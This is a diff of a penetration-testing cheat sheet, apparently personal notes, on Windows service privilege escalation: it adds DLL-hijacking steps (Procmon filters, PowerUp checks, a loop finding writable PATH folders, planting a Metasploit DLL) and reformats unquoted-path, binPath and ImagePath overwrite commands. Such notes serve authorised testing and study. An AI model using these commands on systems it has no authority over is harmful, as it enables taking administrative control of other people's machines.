@@ -6788,55 +6788,83 @@ See SeLoadDriver privilege
 - Manual:
 
 	```cmd
-	wmic service get displayname,startmode,startname,pathname | findstr /iv "c:\windows\\" | findstr /iv "Disabled" | findstr /iv "Unknown"
+	wmic service get name,displayname,startmode,startname,pathname | findstr /iv "c:\windows\\" | findstr /iv "Disabled" | findstr /iv "Unknown"
 	```
-
-	- Ignore services with spaces (they are 90% of the case, fake)
 
 	Autorun services:
 
 	```cmd
 	wmic startup get name,location,command,user
 	```
-
+	
 - Auto: 
 
-	- cmd: [SharpUp](https://github.com/GhostPack/SharpUp/) `.\SharpUp.exe audit`
-	- powershell: PowerUP
+	- CMD: [SharpUp](https://github.com/GhostPack/SharpUp/) `.\SharpUp.exe audit`
+	- Powershell: PowerUP - `Invoke-AllChecks`
 
 #### Exploit
 
+- **DLL Hijacking** - [Resource](https://juggernaut-sec.com/dll-hijacking/)
+
+  - Find all Loaded DLLs of a startable service executable (enumerated above)
+
+    - Procmon - Needs RDP + Application Transfer
+      - Filters: `Path Ends With = .dll`
+      - Filters: `Process Name Is = [SERVICE_EXECUTABLE]`
+      - Start Procmon Capture -> Re-start service -> Observe Traffic -> Stop Capture
+      - More General Approach
+
+    - PowerUP
+      - `Find-ProcessDLLHijack -ExcludeOwned -ExcludeWindows` 
+      - DLL Of Running Processes (Less General)
+
+  - Check if the one of the following is true
+
+    - DLL is being loaded from a writable path
+
+    - DLL is `NAME NOT FOUND`
+
+      - Check if you can write in the directory from which it's not found
+
+      - Check if you can write anywhere in the PATH of the system
+
+      - ```cmd
+        for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" && echo.
+        ```
+
+  - Place a malicious DLL with MSF using the correct name and trigger the service
+
 - **Unquoted Path**:
 
-	Every time there is a space, try to see if you can write that folder with an executable with the name up to that position of the path. 
+  Every time there is a space, try to see if you can write that folder with an executable with the name up to that position of the path. 
 
-	E.g. `C:\Program Files\GVFS\GVFS.Service.exe` &rarr; write `C:\Program.exe`
+  E.g. `C:\Program Files\GVFS\GVFS.Service.exe` &rarr; write `C:\Program.exe`
 
 - **Replace Binary**
 
-	See if you directly write the binary
+  See if you directly write the binary
 
 - **Path Overwrite**
 
-	- BinPath (only normal services)
+  - BinPath (only normal services)
 
-		```cmd
-		sc config [SERVICE] binPath="[MALWARE/CMD]"
-		```
+  	```cmd
+  	sc config [SERVICE] binPath="[MALWARE/CMD]"
+  	```
 
-		First try to write `" "` to check if you have permission
+  	First try to write `" "` to check if you have permission
 
-	- ImagePath (only on autorun services)
+  - ImagePath (only on autorun services)
 
-		```powershell
-		Set-ItemProperty -Path HKLM:[REG\PATH] -Name "ImagePath" -Value "[CMD]"
-		```
+  	```powershell
+  	Set-ItemProperty -Path HKLM:[REG\PATH] -Name "ImagePath" -Value "[CMD]"
+  	```
 
 - **Restart:**
 
-	- Manual: `sc [stop/start] [SERVICE]` (`sc query` to verify)
-		- The service will fail to start
-	- Auto: `shutdown /r /t 0`
+  - Manual: `sc [stop/start] [SERVICE]` (`sc query` to verify)
+  	- The service will fail to start
+  - Auto: `shutdown /r /t 0`
 
 ### Local Processes
 
@@ -6951,12 +6979,12 @@ Exploiting: https://0xdf.gitlab.io/2020/08/08/htb-fatty.html
 
 
 	- [PatchCheker](https://patchchecker.com)
-
+	
 	- ```bash
 		python3 ~\TOOLS\PRIVESC_WINDOWS\wes.py --update-wes
 		python3 ~\TOOLS\PRIVESC_WINDOWS\wes.py systeminfo.txt
 		```
-
+	
 		`systeminfo.txt` is a txt file with the output of systeminfo
 
 #### CVEs
